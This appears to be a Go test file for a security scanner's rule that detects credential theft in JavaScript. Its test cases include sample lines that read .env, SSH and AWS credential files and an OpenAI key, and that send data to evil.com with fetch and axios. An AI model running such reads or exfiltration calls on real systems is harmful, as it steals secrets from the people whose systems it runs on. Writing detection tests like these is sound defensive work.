package rules

import (
	"testing"

	"github.com/FlppFer/MCPGuard/internal/service/model"
	"github.com/FlppFer/MCPGuard/internal/service/static_analysis/languages/javascript"
)

func TestJSCredentialTheftRule_ID(t *testing.T) {
	rule := NewJSCredentialTheftRule()
	if rule.ID() != "MCP-JS-CRED-001" {
		t.Errorf("ID() = %v, want MCP-JS-CRED-001", rule.ID())
	}
}

func TestJSCredentialTheftRule_AppliesToLanguage(t *testing.T) {
	rule := NewJSCredentialTheftRule()
	if rule.AppliesToLanguage() != "javascript" {
		t.Errorf("AppliesToLanguage() = %v, want javascript", rule.AppliesToLanguage())
	}
}

func TestJSCredentialTheftRule_Evaluate(t *testing.T) {
	tests := []struct {
		name         string
		code         string
		wantFindings bool
		minFindings  int
	}{
		{
			name:         "env file access",
			code:         `const config = fs.readFileSync('.env');`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "API key in string",
			code:         `const key = "my_api_key_here";`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "SSH key path",
			code:         `const sshKey = fs.readFileSync('.ssh/id_rsa');`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "AWS credentials",
			code:         `const creds = fs.readFileSync('.aws/credentials');`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "OpenAI key access",
			code:         `const key = process.env.OPENAI_API_KEY;`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "fetch exfiltration",
			code:         `fetch("https://evil.com/steal", { method: "POST", body: data });`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "axios exfiltration",
			code:         `axios.post("https://evil.com", secretData);`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "safe code",
			code:         `const x = 42; console.log("hello");`,
			wantFindings: false,
		},
	}

	rule := NewJSCredentialTheftRule()
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ast, err := javascript.ParseJavaScriptSource("test.js", []byte(tt.code))
			if err != nil {
				t.Fatalf("Failed to parse: %v", err)
			}
			findings, err := rule.Evaluate(ast)
			if err != nil {
				t.Fatalf("Evaluate() error = %v", err)
			}
			if tt.wantFindings && len(findings) < tt.minFindings {
				t.Errorf("Expected at least %d findings, got %d", tt.minFindings, len(findings))
			}
			if !tt.wantFindings && len(findings) > 0 {
				t.Errorf("Expected no findings, got %d: %+v", len(findings), findings)
			}
		})
	}
}

func TestJSCredentialTheftRule_SensitiveFileSeverity(t *testing.T) {
	rule := NewJSCredentialTheftRule()
	ast, err := javascript.ParseJavaScriptSource("test.js", []byte(`const data = fs.readFileSync('.env');`))
	if err != nil {
		t.Fatal(err)
	}
	findings, _ := rule.Evaluate(ast)
	hasHigh := false
	for _, f := range findings {
		if f.Severity == model.SeverityHigh {
			hasHigh = true
		}
	}
	if !hasHigh {
		t.Error("Expected HIGH severity for .env access")
	}
}

func TestJSCredentialTheftRule_NonJSAST(t *testing.T) {
	rule := NewJSCredentialTheftRule()
	findings, err := rule.Evaluate("not a JS ast")
	if err != nil {
		t.Errorf("Should not error, got %v", err)
	}
	if findings != nil {
		t.Errorf("Should return nil, got %v", findings)
	}
}
